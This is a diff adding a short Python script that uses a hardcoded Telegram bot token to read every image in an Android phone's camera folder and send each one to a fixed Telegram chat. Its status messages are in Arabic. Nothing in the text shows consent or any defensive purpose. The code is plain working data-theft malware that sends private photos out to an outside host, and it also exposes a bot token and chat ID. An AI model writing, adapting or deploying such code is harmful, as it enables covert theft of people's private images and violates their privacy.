@@ -1,0 +1,19 @@
+import os
+import telebot
+
+bot = telebot.TeleBot("8669214037:AAHBBzBfaMgCMnrMKd-KcDiFKmXI9BfgDOQ")
+
+dir_path = "/storage/emulated/0/DCIM/Camera/"
+
+for file_name in os.listdir(dir_path):
+    file_path = os.path.join(dir_path, file_name)
+
+    if file_name.lower().endswith((".jpg", ".jpeg", ".png", ".webp")):
+        try:
+            with open(file_path, "rb") as f:
+                bot.send_photo(chat_id="6287438473", photo=f)
+                print(f"✔️ تم إرسال: {file_name}")
+        except Exception as e:
+            print(f"❌ خطأ أثناء إرسال {file_name}: {e}")
+    else:
+        print(f"تخطي الملف: {file_name}")
